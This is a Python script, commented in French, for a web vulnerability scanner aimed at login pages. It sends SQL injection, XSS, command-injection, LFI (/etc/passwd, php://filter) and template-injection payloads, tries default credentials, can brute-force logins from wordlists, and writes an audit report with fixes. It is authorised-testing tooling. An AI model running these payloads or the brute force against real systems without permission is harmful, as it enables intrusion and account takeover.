#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
login-test v2 - Outil d'audit de vulnerabilites web

Teste une page (souvent une page de login) sur les grandes familles de
vulnerabilites web et produit un rapport texte ou HTML.

Usage :
    python login-test.py --url http://cible/login
    python login-test.py --url http://cible/login --format html --output rapport.html
    python login-test.py --url http://cible/login --brute --users users.txt --passwords pass.txt

Avertissement : usage educatif et tests autorises uniquement.
"""

import argparse
import os
import sys
import re
import datetime
import requests

# On desactive les warnings TLS pour les labs en https auto-signe
requests.packages.urllib3.disable_warnings()


# ─────────────────────────────────────────────────────────────
#  PAYLOADS
# ─────────────────────────────────────────────────────────────

SQL_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1' -- -", "' OR 1=1 -- -",
    "admin' -- -", "admin' #", "') OR ('1'='1",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
]

CMD_PAYLOADS = ["; id", "| id", "|| id", "& id", "`id`", "$(id)"]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

# Familles de failles ajoutees en v2
SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]

DEFAULT_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("root", "root"), ("root", "toor"), ("test", "test"),
]

SECURITY_HEADERS = [
    "X-Content-Type-Options", "X-Frame-Options",
    "Content-Security-Policy", "Strict-Transport-Security",
]


# ─────────────────────────────────────────────────────────────
#  STRUCTURE D'UN RESULTAT
# ─────────────────────────────────────────────────────────────

class Finding:
    """Un resultat de test : titre, gravite, details, recommandation."""
    def __init__(self, title, severity, detail, reco, vulnerable):
        self.title = title
        self.severity = severity      # "critique", "moyenne", "info"
        self.detail = detail
        self.reco = reco
        self.vulnerable = vulnerable   # True si faille trouvee

    def status(self):
        return "VULNÉRABLE" if self.vulnerable else "OK"


# ─────────────────────────────────────────────────────────────
#  TESTS
# ─────────────────────────────────────────────────────────────

def test_sql_injection(url, u_field, p_field):
    for payload in SQL_PAYLOADS:
        try:
            r = requests.post(url, data={u_field: payload, p_field: payload},
                              verify=False, timeout=10)
            if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
                return Finding(
                    "Injection SQL", "critique",
                    f"Contournement possible avec le payload : {payload}",
                    "Utiliser des requetes preparees (prepared statements).",
                    True)
        except requests.RequestException:
            pass
    return Finding("Injection SQL", "info",
                   "Aucun contournement detecte avec les payloads testes.",
                   "Continuer a utiliser des requetes preparees.", False)


def test_xss(url, u_field, p_field):
    for payload in XSS_PAYLOADS:
        try:
            r = requests.post(url, data={u_field: payload, p_field: payload},
                              verify=False, timeout=10)
            if payload in r.text:
                return Finding(
                    "XSS (Cross-Site Scripting)", "critique",
                    f"Charge reflechie sans echappement : {payload}",
                    "Echapper les sorties selon le contexte, definir une CSP.",
                    True)
        except requests.RequestException:
            pass
    return Finding("XSS", "info",
                   "Aucune charge reflechie sans echappement detectee.",
                   "Maintenir l'echappement des sorties et une CSP stricte.", False)


def test_command_injection(url, u_field, p_field):
    for payload in CMD_PAYLOADS:
        try:
            r = requests.post(url, data={u_field: payload, p_field: "test"},
                              verify=False, timeout=10)
            if "uid=" in r.text or "gid=" in r.text:
                return Finding(
                    "Injection de commande", "critique",
                    f"Execution systeme detectee avec : {payload}",
                    "Ne jamais passer d'entree utilisateur a un shell.",
                    True)
        except requests.RequestException:
            pass
    return Finding("Injection de commande", "info",
                   "Aucune execution systeme detectee.",
                   "Utiliser les API du langage plutot que des commandes shell.",
                   False)


def test_lfi(url):
    for payload in LFI_PAYLOADS:
        try:
            r = requests.get(url, params={"file": payload}, verify=False, timeout=10)
            if "root:x:" in r.text or "root:" in r.text:
                return Finding(
                    "Inclusion de fichiers (LFI)", "critique",
                    f"Lecture de fichier local avec : {payload}",
                    "Ne pas construire de chemin a partir d'une entree utilisateur.",
                    True)
        except requests.RequestException:
            pass
    return Finding("Inclusion de fichiers (LFI)", "info",
                   "Aucune inclusion de fichier local detectee.",
                   "Valider les entrees, liste blanche des fichiers autorises.",
                   False)


def test_ssti(url, u_field, p_field):
    """Nouveau en v2 : Server-Side Template Injection."""
    for payload in SSTI_PAYLOADS:
        try:
            r = requests.post(url, data={u_field: payload, p_field: "test"},
                              verify=False, timeout=10)
            if "49" in r.text:   # 7*7 evalue = injection de template
                return Finding(
                    "Injection de template (SSTI)", "critique",
                    f"Le template a evalue l'expression : {payload} -> 49",
                    "Ne pas injecter d'entree utilisateur dans un template, sandbox.",
                    True)
        except requests.RequestException:
            pass
    return Finding("Injection de template (SSTI)", "info",
                   "Aucune evaluation de template detectee.",
                   "Isoler les entrees utilisateur des moteurs de template.", False)


def test_default_credentials(url, u_field, p_field):
    """Nouveau en v2 : test de couples d'identifiants par defaut."""
    for user, pwd in DEFAULT_CREDENTIALS:
        try:
            r = requests.post(url, data={u_field: user, p_field: pwd},
                              verify=False, timeout=10)
            if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
                return Finding(
                    "Identifiants par defaut", "critique",
                    f"Connexion reussie avec {user}:{pwd}",
                    "Forcer le changement des identifiants par defaut.",
                    True)
        except requests.RequestException:
            pass
    return Finding("Identifiants par defaut", "info",
                   "Aucun couple d'identifiants par defaut n'a fonctionne.",
                   "Continuer a interdire les identifiants faibles.", False)


def analyze_headers(url):
    try:
        r = requests.get(url, verify=False, timeout=10)
        missing = [h for h in SECURITY_HEADERS if h not in r.headers]
        if missing:
            return Finding(
                "En-tetes de securite", "moyenne",
                "En-tetes manquants : " + ", ".join(missing),
                "Ajouter ces en-tetes pour renforcer la defense en profondeur.",
                True)
        return Finding("En-tetes de securite", "info",
                       "Tous les en-tetes de securite verifies sont presents.",
                       "Maintenir cette configuration.", False)
    except requests.RequestException:
        return Finding("En-tetes de securite", "info",
                       "Impossible de recuperer les en-tetes.",
                       "Verifier la disponibilite de la cible.", False)


def brute_force(url, u_field, p_field, users_path, pass_path):
    if not (os.path.exists(users_path) and os.path.exists(pass_path)):
        return Finding("Force brute", "info",
                       "Dictionnaires introuvables, test ignore.",
                       "Fournir des chemins valides pour activer ce test.", False)
    with open(users_path) as f:
        users = f.read().splitlines()
    with open(pass_path) as f:
        passwords = f.read().splitlines()
    for user in users:
        for pwd in passwords:
            try:
                r = requests.post(url, data={u_field: user, p_field: pwd},
                                  verify=False, timeout=10)
                if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
                    return Finding(
                        "Force brute", "critique",
                        f"Identifiants trouves : {user}:{pwd}",
                        "Limiter les tentatives, verrouillage, MFA.",
                        True)
            except requests.RequestException:
                pass
    return Finding("Force brute", "info",
                   "Aucun identifiant trouve avec les dictionnaires fournis.",
                   "Maintenir une politique de mots de passe robuste.", False)


# ─────────────────────────────────────────────────────────────
#  RAPPORTS
# ─────────────────────────────────────────────────────────────

def write_text_report(findings, url, path):
    lines = [
        "=" * 60,
        "  RAPPORT D'AUDIT - login-test v2",
        f"  Cible : {url}",
        f"  Date  : {datetime.datetime.now():%Y-%m-%d %H:%M}",
        "=" * 60, "",
    ]
    for f in findings:
        lines.append(f"[{f.status()}] {f.title}  (gravite : {f.severity})")
        lines.append(f"    {f.detail}")
        lines.append(f"    Reco : {f.reco}")
        lines.append("")
    with open(path, "w", encoding="utf-8") as out:
        out.write("\n".join(lines))
    print(f"[INFO] Rapport texte ecrit dans {path}")


def write_html_report(findings, url, path):
    colors = {"critique": "#C0392B", "moyenne": "#B5710B", "info": "#2E7D32"}
    rows = ""
    for f in findings:
        color = colors.get(f.severity, "#666")
        badge = "VULNÉRABLE" if f.vulnerable else "OK"
        badge_bg = "#C0392B" if f.vulnerable else "#2E7D32"
        rows += f"""
        <div class="card" style="border-left-color:{color}">
          <div class="head">
            <span class="title">{f.title}</span>
            <span class="badge" style="background:{badge_bg}">{badge}</span>
            <span class="sev" style="color:{color}">{f.severity}</span>
          </div>
          <p class="detail">{f.detail}</p>
          <p class="reco"><b>Recommandation :</b> {f.reco}</p>
        </div>"""

    html = f"""<!DOCTYPE html>
<html lang="fr"><head><meta charset="utf-8">
<title>Rapport login-test</title>
<style>
  body {{ font-family: system-ui, sans-serif; background:#f4f3ee; color:#1a1a1a; margin:0; padding:30px; }}
  h1 {{ font-size:22px; }}
  .meta {{ color:#666; font-size:13px; margin-bottom:20px; }}
  .card {{ background:#fff; border-left:5px solid #666; border-radius:4px;
          padding:12px 16px; margin-bottom:12px; box-shadow:0 1px 4px rgba(0,0,0,.06); }}
  .head {{ display:flex; align-items:center; gap:12px; }}
  .title {{ font-weight:600; font-size:15px; }}
  .badge {{ color:#fff; font-size:11px; padding:2px 8px; border-radius:3px; }}
  .sev {{ font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-left:auto; }}
  .detail {{ font-size:13px; margin:8px 0 4px; }}
  .reco {{ font-size:12px; color:#444; }}
</style></head>
<body>
  <h1>Rapport d'audit - login-test v2</h1>
  <div class="meta">Cible : {url}<br>Date : {datetime.datetime.now():%Y-%m-%d %H:%M}</div>
  {rows}
</body></html>"""
    with open(path, "w", encoding="utf-8") as out:
        out.write(html)
    print(f"[INFO] Rapport HTML ecrit dans {path}")


# ─────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Outil d'audit de vulnerabilites web (usage autorise uniquement).")
    parser.add_argument("--url", required=True, help="URL de la page a tester")
    parser.add_argument("--user-field", default="username", help="Nom du champ utilisateur")
    parser.add_argument("--pass-field", default="password", help="Nom du champ mot de passe")
    parser.add_argument("--format", choices=["texte", "html"], default="texte",
                        help="Format du rapport")
    parser.add_argument("--output", help="Fichier de sortie du rapport")
    parser.add_argument("--brute", action="store_true", help="Activer le test de force brute")
    parser.add_argument("--users", help="Dictionnaire de noms d'utilisateur")
    parser.add_argument("--passwords", help="Dictionnaire de mots de passe")
    args = parser.parse_args()

    u, p = args.user_field, args.pass_field
    print(f"[INFO] Audit de {args.url}\n")

    findings = [
        test_sql_injection(args.url, u, p),
        test_xss(args.url, u, p),
        test_command_injection(args.url, u, p),
        test_lfi(args.url),
        test_ssti(args.url, u, p),
        test_default_credentials(args.url, u, p),
        analyze_headers(args.url),
    ]

    if args.brute:
        if args.users and args.passwords:
            findings.append(brute_force(args.url, u, p, args.users, args.passwords))
        else:
            print("[WARN] --brute demande mais --users/--passwords manquants, test ignore.")

    # Affichage console
    for f in findings:
        print(f"[{f.status()}] {f.title} ({f.severity}) : {f.detail}")

    # Rapport fichier
    default_name = "rapport.html" if args.format == "html" else "rapport.txt"
    output = args.output or default_name
    if args.format == "html":
        write_html_report(findings, args.url, output)
    else:
        write_text_report(findings, args.url, output)


if __name__ == "__main__":
    main()
